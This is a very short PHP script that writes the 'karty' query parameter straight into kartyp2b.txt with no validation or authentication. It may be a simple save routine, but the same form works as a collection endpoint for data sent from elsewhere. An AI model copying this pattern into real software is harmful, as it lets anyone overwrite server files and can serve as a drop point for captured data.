<?
$x=$_GET["karty"];



$fp = fopen("kartyp2b.txt", "w");
fputs($fp, $x);
fclose($fp);


?>